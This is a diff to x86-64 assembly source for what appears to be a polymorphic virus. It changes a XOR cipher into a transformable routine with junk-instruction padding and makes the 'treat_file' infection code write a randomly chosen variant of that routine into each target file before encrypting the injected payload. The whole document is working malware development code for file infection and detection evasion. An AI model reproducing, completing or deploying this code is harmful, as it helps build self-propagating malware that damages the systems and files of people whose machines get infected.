@@ -70,40 +70,47 @@ POLY_jmp_program_entry_end:
 
 	nop						; Needed because of script bug about two labels following
 
+POLY_xor_cipher_begin:
 ; void xor_cipher(char *data, int size, char *key, int key_size);
 ; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
 xor_cipher:
-	push rcx					; save key_size
-	push rdx					; save key
+	xor r8, r8					; i_key = 0;
+	push rbp				; nop
+	pop rbp					; ...
+	xor r9, r9					; i_data = 0;
 
 	.loop:
-		cmp rsi, 0				; if (size == 0)
+		cmp r9, rsi, 			; if (i_data == size)
 		je .end					; 	goto .end
 
-		mov al, [rdi]				; al = *data
-		mov bl, [rdx]				; bl = *key
+		mov r10, rdx			; cur_key_ptr = key
+		add r10, r8				; + i_key;
+		mov bl, [r10]			; bl = *cur_key_ptr
+
+		mov r10, rdi			; cur_data_ptr = data
+		add r10, r9				; + i_data;
+		push rbp				; nop
+		pop rbp					; ...
+		mov al, [r10]			; al = *cur_data_ptr
+
 		xor al, bl				; al ^= bl
-		mov [rdi], al				; *data = al
+		mov [r10], al			; *cur_data_ptr = al
 
-		inc rdi					; data++
-		inc rdx					; key++
-		dec rsi					; size--
-		dec rcx					; key_size--
+		inc r8					; i_key++;
+		inc r9					; i_data++;
 
-		cmp rcx, 0				; if (key_size == 0)
-		je .key_reset				; 	goto .key_reset
+		cmp r8, rcx,			; if (i_key == key_size)
+		je .key_reset			; 	goto .key_reset
 
 		jmp .loop				; goto .loop
 
 	.key_reset:
-		mov rdx, [rsp]				; restore key
-		mov rcx, [rsp + 8]			; ...
+		xor r8, r8				; restore key
 		jmp .loop				; goto .loop
 
 	.end:
-		pop rdx					; reset stack
-		pop rcx					; ...
 		ret					; return
+POLY_xor_cipher_end:
 ; TODO end transformable section
 
 key: times KEY_SIZE dq 0x0
@@ -571,6 +578,9 @@ poly_call_uncipher_count: dq 0				; Will be replaced by a script
 poly_jmp_program_entry_buffer: db 0x00			; Will be replaced by a script
 poly_jmp_program_entry_size: dq 0			; Will be replaced by a script
 poly_jmp_program_entry_count: dq 0			; Will be replaced by a script
+poly_xor_cipher_buffer: db 0x00			; Will be replaced by a script
+poly_xor_cipher_size: dq 0			; Will be replaced by a script
+poly_xor_cipher_count: dq 0			; Will be replaced by a script
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
@@ -599,7 +609,6 @@ infection_routine:
 	mov rax, SYS_TIME				; _ret = time(
 	xor rdi, rdi					; NULL
 	syscall						; );
-	mov rax, 7			; TEMP TODO DEBUG JUST TO FAKE RANDOM
 
 	add rax, [rel fingerprint_int]			; _base = _ret + fingerprint_int;
 	mov rdi, rax					; srand(_base);
@@ -1085,6 +1094,20 @@ treat_file:
 	add rdi, POLY_jmp_program_entry_begin - _start	; 	+ (.POLY_jmp_program_entry_begin - _start)
 	mov rcx, [rel poly_jmp_program_entry_size]	; _poly_jmp_program_entry_size = poly_jmp_program_entry_size;
 	rep movsb					; memcpy(_poly_jmp_program_entry_ptr, variation_ptr, _poly_jmp_program_entry_size);
+
+	; replace injected xor_cipher by a random poly_xor_cipher
+	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_xor_cipher_count, poly_xor_cipher_size, poly_xor_cipher_buffer);
+	mov rsi, [rand_index]				; ...
+	mov rdx, [rel poly_xor_cipher_count]		; ...
+	mov rcx, [rel poly_xor_cipher_size]		; ...
+	lea r8, [rel poly_xor_cipher_buffer]		; ...
+	call get_variation_ptr				; ...
+	mov rsi, rax					; ...
+	mov rdi, [mappedfile]				; _poly_xor_cipher_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, POLY_xor_cipher_begin - _start	; 	+ (.POLY_xor_cipher_begin - _start)
+	mov rcx, [rel poly_xor_cipher_size]		; _poly_xor_cipher_size = poly_xor_cipher_size;
+	rep movsb					; memcpy(_poly_xor_cipher_ptr, variation_ptr, _poly_xor_cipher_size);
 
 	; xor cipher all injected bytes between obfuscation_begin and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (obfuscation_begin - _start);
